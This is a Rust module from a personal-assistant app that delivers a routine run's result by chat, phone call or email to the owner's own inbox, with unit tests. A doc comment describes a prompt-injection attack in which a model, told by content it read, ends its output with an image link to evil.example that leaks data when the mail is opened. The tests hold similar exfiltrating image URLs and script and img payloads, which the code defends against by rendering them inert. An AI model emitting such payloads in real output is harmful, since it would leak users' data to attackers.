//! Sending a finished run's result to where its routine says, besides the app.
//!
//! A routine's [`Delivery`] names up to two places: the owner's chat on one
//! of their chat links, and their own inbox through one of their mail
//! accounts. The run is kept in the Assistant app whatever happens here; this
//! adds copies, and writes down on the run whether each one got there, so
//! "why did I not get my brief on my phone" has an answer in the log.
//!
//! What is sent is one message: the routine's name, then the model's last
//! word -- which it was told would be sent, and wrote as that message (see
//! `agent::unattended_context`) -- then a line about anything it left waiting
//! for a decision. A run that failed says so, once per streak of failures,
//! exactly as the desktop notification does.
//!
//! The pictures the run made -- `generate_image`, `draw_illustration` -- go
//! with it: to the chat as pictures, after the message, and into the email
//! as attachments. They are read back from the run's own transcript, so
//! only what this run made goes, and they are in Files whatever happens.
//!
//! The email goes from the account to its own address and nowhere else. The
//! address is read from the account, never from anything a model wrote, so a
//! routine set up by the assistant cannot be talked into mailing somebody
//! else.

use crate::chat::{CallDelivered, ChatOutlet, FromRun};
use crate::service::{Service, blocking};
use karmayoga_core::FileId;
use karmayoga_core::files::FileKind;
use karmayoga_core::mail::{Address, Draft, DraftAttachment, Origin};
use karmayoga_core::routine::{Delivered, DeliveredTo, Outcome, Routine, RoutineRun};
use karmayoga_core::{ProposalQuery, Vault};
use pulldown_cmark::{CowStr, Event, LinkType, Options, Parser, Tag, TagEnd};
use std::sync::Arc;
use std::time::Duration;

/// How long a message to the chat may take to go before the run stops
/// waiting for it. Generous, because it waits behind whatever the owner's
/// own chat is doing at the time.
pub(crate) const POST_TIMEOUT: Duration = Duration::from_secs(120);

/// How long delivering by a call may take before the run stops waiting: the
/// wait behind the chat's own work, then the ringing, then the message that
/// goes instead if nobody picks up.
pub(crate) const CALL_TIMEOUT: Duration = Duration::from_secs(240);

/// The most a run's pictures may add to its email, in bytes. Past this the
/// rest stay in Files: most mail servers refuse a message over 25 MB, and
/// attachments grow by a third on the way.
const EMAILED_PICTURE_BYTES: u64 = 15 * 1024 * 1024;

/// Send `run`'s result to every place `routine` names. One [`Delivered`] per
/// place, in the order the routine's [`Delivery`] lists them; empty when it
/// names none, or the run has nothing to say.
///
/// `outlet` is the chat link's, looked up when the run started -- `None` when
/// the routine names no chat, or names one that is not running here.
pub(crate) async fn deliver(
    service: &Arc<Service>,
    vault: &Arc<Vault>,
    routine: &Routine,
    run: &RoutineRun,
    outlet: Option<Arc<dyn ChatOutlet>>,
) -> Vec<Delivered> {
    let delivery = &routine.delivery;
    if routine.kind.is_dream() || delivery.is_empty() {
        return Vec::new();
    }
    let waiting = blocking({
        let vault = vault.clone();
        let run_id = run.id;
        move || {
            if !vault.supports_proposals() {
                return Ok(0);
            }
            let query = ProposalQuery { run_id: Some(run_id), ..ProposalQuery::pending() };
            Ok(vault.proposals(&query)?.len())
        }
    })
    .await
    .unwrap_or(0);
    let Some(message) = report(&routine.name, run, waiting) else { return Vec::new() };
    let pictures = match (run.outcome == Outcome::Done, run.conversation_id) {
        (true, Some(conversation)) => blocking({
            let vault = vault.clone();
            move || Ok(crate::images::tools::made_in(&vault.messages(conversation)?))
        })
        .await
        .unwrap_or_default(),
        _ => Vec::new(),
    };

    let mut delivered = Vec::new();
    if let Some(link) = delivery.chat {
        let label = blocking({
            let vault = vault.clone();
            move || Ok(vault.chat_settings()?.link(link).map(|l| l.service.label().to_string()))
        })
        .await
        .ok()
        .flatten();
        let shows = outlet.clone();
        let mut sent = match (label, outlet) {
            (None, _) => Delivered {
                to: DeliveredTo::Chat,
                ok: false,
                detail: "the chat link it named no longer exists".into(),
            },
            (Some(label), None) => Delivered {
                to: DeliveredTo::Chat,
                ok: false,
                detail: format!("{label} was not connected"),
            },
            // A result worth calling about: one that ran. A run that failed is
            // written, not rung through.
            (Some(label), Some(outlet)) if delivery.calls() && run.outcome == Outcome::Done => {
                let from = FromRun {
                    routine: routine.name.clone(),
                    conversation: run.conversation_id,
                    job: None,
                };
                let spoken = spoken(&routine.name, run, waiting);
                let call = outlet.call(from, message.clone(), spoken);
                match tokio::time::timeout(CALL_TIMEOUT, call).await {
                    Ok(Ok(CallDelivered::PickedUp)) => Delivered {
                        to: DeliveredTo::Chat,
                        ok: true,
                        detail: format!("{label}, on a call they picked up"),
                    },
                    Ok(Ok(CallDelivered::Messaged { why })) => Delivered {
                        to: DeliveredTo::Chat,
                        ok: true,
                        detail: format!("{label}, as a message: {why}"),
                    },
                    Ok(Err(why)) => Delivered { to: DeliveredTo::Chat, ok: false, detail: why },
                    Err(_) => Delivered {
                        to: DeliveredTo::Chat,
                        ok: false,
                        detail: format!("{label} did not call or send it in time"),
                    },
                }
            }
            (Some(label), Some(outlet)) => {
                let from = FromRun {
                    routine: routine.name.clone(),
                    conversation: run.conversation_id,
                    job: None,
                };
                match tokio::time::timeout(POST_TIMEOUT, outlet.post(from, message.clone())).await {
                    Ok(Ok(())) => Delivered { to: DeliveredTo::Chat, ok: true, detail: label },
                    Ok(Err(why)) => Delivered { to: DeliveredTo::Chat, ok: false, detail: why },
                    Err(_) => Delivered {
                        to: DeliveredTo::Chat,
                        ok: false,
                        detail: format!("{label} did not take the message in time"),
                    },
                }
            }
        };
        if let Some(outlet) = shows
            && sent.ok
            && !pictures.is_empty()
        {
            let from = FromRun {
                routine: routine.name.clone(),
                conversation: run.conversation_id,
                job: None,
            };
            let shown = tokio::time::timeout(POST_TIMEOUT, outlet.show(from, pictures.clone()));
            sent.detail.push_str(&match shown.await {
                Ok(Ok(0)) => String::new(),
                Ok(Ok(n)) => format!(", with {}", pictures_said(n)),
                Ok(Err(why)) => format!("; its pictures did not go: {why}"),
                // Queued behind the chat's own work, they still go when it
                // gets to them; this only stopped waiting to say so.
                Err(_) => "; its pictures were still waiting behind the chat after two minutes, \
                           and go when it is free"
                    .to_string(),
            });
        }
        delivered.push(sent);
    }
    if let Some(account) = delivery.email {
        let sent = blocking({
            let vault = vault.clone();
            let (name, run) = (routine.name.clone(), run.clone());
            let html = html_of(&message);
            let origin = Origin::Routine { run: run.id.to_string() };
            let pictures = pictures.clone();
            move || {
                let subject = subject(&name, &run, vault.agent_settings().ok());
                let account = vault.account(account)?;
                if !account.services.mail {
                    return Ok(Err(format!("mail is switched off for {}", account.address)));
                }
                let mut draft = Draft::new(account.id, account.address.clone(), origin.clone());
                draft.to =
                    vec![Address::new(account.display_name.clone(), account.address.clone())];
                draft.subject = subject;
                draft.body_html = html;
                let (attached, left) = attach_pictures(&vault, &pictures);
                draft.attachments = attached;
                let attached = draft.attachments.len();
                vault.save_draft(&draft)?;
                vault.queue_draft_send(draft.id, jiff::Timestamp::now(), origin)?;
                let mut detail = account.address;
                if attached > 0 {
                    detail.push_str(&format!(", with {}", pictures_said(attached)));
                }
                if left > 0 {
                    detail.push_str(&format!(
                        " ({} too big to email, left in Files)",
                        pictures_said(left)
                    ));
                }
                Ok(Ok((account.id, detail)))
            }
        })
        .await;
        delivered.push(match sent {
            Ok(Ok((account, detail))) => {
                service.notify_mail_write(account);
                Delivered { to: DeliveredTo::Email, ok: true, detail }
            }
            Ok(Err(why)) => Delivered { to: DeliveredTo::Email, ok: false, detail: why },
            Err(e) => Delivered {
                to: DeliveredTo::Email,
                ok: false,
                detail: format!("the mail account could not be used: {}", e.message),
            },
        });
    }
    delivered
}

/// `pictures` as a mail's attachments, as many as fit in
/// [`EMAILED_PICTURE_BYTES`], and how many did not fit. One that is gone from
/// Files, or cannot be read, is skipped without a word: the run's own thread
/// says what it made.
fn attach_pictures(vault: &Vault, pictures: &[FileId]) -> (Vec<DraftAttachment>, usize) {
    let (mut attached, mut left, mut bytes) = (Vec::new(), 0, 0u64);
    for &id in pictures {
        let Ok(entry) = vault.file(id) else { continue };
        if entry.status.is_trashed() || entry.kind != FileKind::Image {
            continue;
        }
        if bytes + entry.size > EMAILED_PICTURE_BYTES {
            left += 1;
            continue;
        }
        let Ok(content) = vault.read_file_range(id, 0, entry.size) else { continue };
        let Ok(blob) = vault.put_blob(&content) else { continue };
        bytes += entry.size;
        attached.push(DraftAttachment { blob, filename: entry.name, mime_type: entry.mime });
    }
    (attached, left)
}

/// "a picture", "3 pictures".
fn pictures_said(n: usize) -> String {
    if n == 1 { "a picture".into() } else { format!("{n} pictures") }
}

/// What is said when the owner picks up a call made with `run`'s result: who
/// is calling about what, the result, anything left waiting, and that they
/// can ask about it. Written as speech; the voice reads it as it reads a
/// reply, so the result's own Markdown is fine.
pub(crate) fn spoken(name: &str, run: &RoutineRun, waiting: usize) -> String {
    let mut out = format!("This is your {}.", name.trim().trim_end_matches('.'));
    let said = run.summary.trim();
    if !said.is_empty() {
        out.push_str("\n\n");
        out.push_str(said);
    }
    match waiting {
        0 => {}
        1 => out.push_str("\n\nOne thing is waiting for you to decide in the Assistant app."),
        n => out.push_str(&format!(
            "\n\n{n} things are waiting for you to decide in the Assistant app."
        )),
    }
    out.push_str("\n\nAsk me anything about it, or say goodbye to hang up.");
    out
}

/// The one message a run's result goes out as, in Markdown -- or `None` when
/// there is nothing worth sending.
///
/// `waiting` is how many of this run's proposals are still waiting for a
/// decision in the app.
pub(crate) fn report(name: &str, run: &RoutineRun, waiting: usize) -> Option<String> {
    let title = format!("**{}**", name.trim());
    match run.outcome {
        Outcome::Done => {
            let said = run.summary.trim();
            if said.is_empty() && run.steps == 0 && waiting == 0 {
                return None;
            }
            let mut out = title;
            if !said.is_empty() {
                out.push_str("\n\n");
                out.push_str(said);
            } else if waiting == 0 {
                out.push_str(
                    "\n\nIt finished without a word. What it did is in the Assistant app.",
                );
            }
            if waiting > 0 {
                let what = if waiting == 1 {
                    "One thing is".to_string()
                } else {
                    format!("{waiting} things are")
                };
                out.push_str(&format!(
                    "\n\n_{what} waiting for you to decide in the Assistant app._"
                ));
            }
            Some(out)
        }
        Outcome::Failed => Some(format!("{title} could not run: {}", run.reason.trim())),
        Outcome::Skipped | Outcome::Queued | Outcome::Running => None,
    }
}

/// "Morning brief — Mon 12 Oct", in the assistant's own time zone.
fn subject(
    name: &str,
    run: &RoutineRun,
    settings: Option<karmayoga_core::AgentSettings>,
) -> String {
    let zone =
        settings.map(|s| s.now().time_zone().clone()).unwrap_or_else(jiff::tz::TimeZone::system);
    let day = run.started_at.to_zoned(zone).strftime("%a %-d %b").to_string();
    format!("{} \u{2014} {day}", name.trim())
}

/// `markdown` as the body of an email.
///
/// Raw HTML in it is shown as text rather than passed through, and an image
/// as its alt text and a link to its address: the words are a model's, and a
/// model's output is not markup this application vouches for, even in a
/// message to the person's own inbox. An image above all -- a model told by a
/// mail or a page it read to end with `![](https://evil.example/?d=<data>)`
/// would have the owner's mail client fetch that address on opening, and the
/// data would leave without a click. See [`inert`].
pub(crate) fn html_of(markdown: &str) -> String {
    let parser = Parser::new_ext(markdown, Options::ENABLE_STRIKETHROUGH | Options::ENABLE_TABLES);
    let mut body = String::new();
    pulldown_cmark::html::push_html(&mut body, inert(parser));
    // Written in paragraphs, and a draft holds lines: see `line_spaced` in
    // `karmayoga-mail`, which sends each `<p>` as an unspaced line.
    let body = karmayoga_core::mail::compose::paragraphs_as_lines(&format!(
        "{body}<p style=\"color: #888; font-size: 12px\">Sent by a routine in Karma Yoga.</p>"
    ));
    format!(
        "<div style=\"font-family: -apple-system, 'Segoe UI', sans-serif; line-height: 1.5\">\
         {body}</div>"
    )
}

/// `events` with nothing left in them that a client would fetch by itself:
/// an image becomes its alt text and its address, and raw HTML the text it
/// is. Everything else passes through untouched.
///
/// The owner's chat uses it too, re-exported as `inert_markdown`: a reply
/// sent to Matrix is rendered by `karmayoga-chat` with the same filter, so
/// neither way out can let a self-loading picture through that the other
/// stops.
pub fn inert<'a>(events: impl Iterator<Item = Event<'a>>) -> impl Iterator<Item = Event<'a>> {
    // The address and title of the image being put into words, its alt text
    // so far, and how many images deep inside that alt text the parser is.
    let mut image: Option<(CowStr<'a>, CowStr<'a>)> = None;
    let mut alt = String::new();
    let mut nested = 0usize;
    // Links open around here: an image inside one has its address shown as
    // text, since a link cannot go inside a link.
    let mut links = 0usize;
    events.flat_map(move |event| {
        if image.is_none() {
            return match event {
                Event::Start(Tag::Image { dest_url, title, .. }) => {
                    image = Some((dest_url, title));
                    Vec::new()
                }
                Event::Start(Tag::Link { .. }) => {
                    links += 1;
                    vec![event]
                }
                Event::End(TagEnd::Link) => {
                    links = links.saturating_sub(1);
                    vec![event]
                }
                Event::Html(raw) | Event::InlineHtml(raw) => vec![Event::Text(raw)],
                other => vec![other],
            };
        }
        match event {
            Event::Start(Tag::Image { .. }) => nested += 1,
            Event::End(TagEnd::Image) if nested > 0 => nested -= 1,
            Event::End(TagEnd::Image) => {
                if let Some((address, title)) = image.take() {
                    return in_words(&std::mem::take(&mut alt), address, title, links > 0);
                }
            }
            Event::Text(text)
            | Event::Code(text)
            | Event::Html(text)
            | Event::InlineHtml(text)
            | Event::InlineMath(text)
            | Event::DisplayMath(text) => alt.push_str(&text),
            Event::SoftBreak | Event::HardBreak => alt.push(' '),
            _ => {}
        }
        Vec::new()
    })
}

/// An image as words: `alt (address)`, or the bare address when it has no
/// alt text. The address is a link the owner can follow, which a mail client
/// never does by itself -- or plain text when `in_link`.
fn in_words<'a>(
    alt: &str,
    address: CowStr<'a>,
    title: CowStr<'a>,
    in_link: bool,
) -> Vec<Event<'a>> {
    let alt = alt.trim();
    if address.trim().is_empty() {
        return if alt.is_empty() { Vec::new() } else { vec![Event::Text(alt.to_owned().into())] };
    }
    let mut words = Vec::new();
    if !alt.is_empty() {
        words.push(Event::Text(format!("{alt} (").into()));
    }
    if in_link {
        words.push(Event::Text(address));
    } else {
        let link = Tag::Link {
            link_type: LinkType::Inline,
            dest_url: address.clone(),
            title,
            id: CowStr::Borrowed(""),
        };
        words.extend([Event::Start(link), Event::Text(address), Event::End(TagEnd::Link)]);
    }
    if !alt.is_empty() {
        words.push(Event::Text(")".into()));
    }
    words
}

#[cfg(test)]
mod tests {
    use super::*;
    use karmayoga_core::routine::Trigger;

    fn run(outcome: Outcome, summary: &str, steps: u32) -> RoutineRun {
        let routine = Routine::new("Morning brief", "Say what is due.", Trigger::Manual);
        let mut run = RoutineRun::new(&routine, None);
        run.outcome = outcome;
        run.summary = summary.into();
        run.steps = steps;
        run
    }

    #[test]
    fn a_finished_run_is_its_name_then_what_it_said() {
        let said = report("Morning brief", &run(Outcome::Done, "Three things are due.", 2), 0);
        assert_eq!(said.as_deref(), Some("**Morning brief**\n\nThree things are due."));
    }

    #[test]
    fn what_it_left_for_a_decision_is_mentioned() {
        let said = report("Tidy", &run(Outcome::Done, "Done.", 1), 2).unwrap();
        assert!(said.ends_with("_2 things are waiting for you to decide in the Assistant app._"));
        let said = report("Tidy", &run(Outcome::Done, "", 1), 1).unwrap();
        assert_eq!(
            said,
            "**Tidy**\n\n_One thing is waiting for you to decide in the Assistant app._"
        );
    }

    #[test]
    fn a_call_opens_with_whose_it_is_then_the_result_then_an_offer_to_ask() {
        let said = spoken("Morning brief", &run(Outcome::Done, "Three things are due.", 2), 1);
        assert_eq!(
            said,
            "This is your Morning brief.\n\nThree things are due.\n\nOne thing is waiting for \
             you to decide in the Assistant app.\n\nAsk me anything about it, or say goodbye \
             to hang up."
        );
    }

    #[test]
    fn a_run_that_did_things_but_said_nothing_says_where_to_look() {
        let said = report("Tidy", &run(Outcome::Done, "", 3), 0).unwrap();
        assert_eq!(
            said,
            "**Tidy**\n\nIt finished without a word. What it did is in the Assistant app."
        );
    }

    #[test]
    fn a_run_with_nothing_to_say_sends_nothing() {
        assert_eq!(report("Tidy", &run(Outcome::Done, "  ", 0), 0), None);
        assert_eq!(report("Tidy", &run(Outcome::Skipped, "", 0), 0), None);
    }

    #[test]
    fn a_failure_says_why() {
        let mut failed = run(Outcome::Failed, "", 0);
        failed.reason = "the endpoint was unreachable".into();
        assert_eq!(
            report("Morning brief", &failed, 0).as_deref(),
            Some("**Morning brief** could not run: the endpoint was unreachable")
        );
    }

    #[test]
    fn the_email_is_the_markdown_rendered_with_any_html_shown_as_text() {
        let html = html_of("**Due today**\n\n- Book the dentist\n\n<script>alert(1)</script>");
        assert!(html.contains("<strong>Due today</strong>"));
        assert!(html.contains("<li>Book the dentist</li>"));
        assert!(!html.contains("<script>"), "got {html}");
        assert!(html.contains("&lt;script&gt;"));
    }

    #[test]
    fn the_emails_paragraphs_go_out_a_blank_line_apart() {
        let html = html_of("First.\n\nSecond.\n\n- a\n- b");
        let sent = karmayoga_mail::compose::line_spaced(&html);
        assert!(sent.contains("<div>First.</div>\n<div><br></div><div>Second.</div>"), "{sent}");
        assert!(
            sent.contains("<div><br></div><ul style=\"margin-top:0;margin-bottom:0\">"),
            "{sent}"
        );
        assert!(sent.contains("</ul>\n<div><br></div><div style=\"color: #888"), "{sent}");
    }

    #[test]
    fn an_image_in_the_email_is_a_link_to_follow_never_a_picture_to_load() {
        let html = html_of(
            "Your chart:\n\n![weekly chart](https://evil.example/?d=secret)\n\n\
             ![](mxc://evil.example/c2VjcmV0) and ![logo][l]\n\n[l]: https://evil.example/l.png",
        );
        assert!(!html.contains("<img"), "got {html}");
        assert!(html.contains(
            "weekly chart (<a href=\"https://evil.example/?d=secret\">\
             https://evil.example/?d=secret</a>)"
        ));
        assert!(html.contains(">mxc://evil.example/c2VjcmV0</a> and logo (<a "), "got {html}");
        assert!(html.contains(">https://evil.example/l.png</a>)"), "got {html}");
    }

    #[test]
    fn an_image_inside_a_link_shows_its_address_as_text() {
        let html = html_of("[![build](https://evil.example/b.png)](https://ci.example)");
        assert!(!html.contains("<img"), "got {html}");
        assert!(
            html.contains("<a href=\"https://ci.example\">build (https://evil.example/b.png)</a>")
        );
        assert_eq!(html.matches("<a ").count(), 1, "got {html}");
    }

    #[test]
    fn raw_img_markup_in_the_email_is_shown_as_text() {
        let html = html_of("Done.\n\n<img src=x>\n\nSee <img src=https://evil.example/p> here");
        assert!(!html.contains("<img"), "got {html}");
        assert!(html.contains("&lt;img src=x&gt;"));
        assert!(html.contains("See &lt;img src=https://evil.example/p&gt; here"));
    }

    #[test]
    fn ordinary_formatting_in_the_email_is_kept() {
        let html = html_of(
            "**Due** _today_: `code`\n\n- [Pay rent](https://bank.example \"Bank\")\n- ~~Gym~~",
        );
        assert!(
            html.contains("<strong>Due</strong> <em>today</em>: <code>code</code>"),
            "got {html}"
        );
        assert!(
            html.contains("<li><a href=\"https://bank.example\" title=\"Bank\">Pay rent</a></li>")
        );
        assert!(html.contains("<li><del>Gym</del></li>"));
    }

    #[test]
    fn the_subject_names_the_routine_and_the_day() {
        let mut r = run(Outcome::Done, "x", 1);
        r.started_at = "2026-10-12T07:00:00Z".parse().unwrap();
        let settings =
            karmayoga_core::AgentSettings { timezone: Some("UTC".into()), ..Default::default() };
        assert_eq!(
            subject("Morning brief", &r, Some(settings)),
            "Morning brief \u{2014} Mon 12 Oct"
        );
    }
}
